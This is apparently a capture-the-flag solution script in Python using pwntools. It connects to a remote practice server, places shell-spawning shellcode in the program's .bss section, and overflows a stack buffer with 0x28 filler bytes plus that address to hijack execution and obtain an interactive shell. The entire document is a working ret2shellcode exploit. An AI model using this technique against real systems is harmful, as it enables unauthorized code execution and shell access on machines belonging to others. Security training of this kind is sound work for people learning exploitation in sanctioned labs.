from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",26932)

context.arch = 'amd64'
#context.log_level = 'debug'


shellcode=asm(shellcraft.sh())
bss=p64(0x0000000000601080)

sh.sendlineafter(b"tell me your name\n",shellcode)
payload=0x28*b'a'+bss
sh.sendlineafter(b"What do you want to say to me?\n",payload)
sh.interactive()
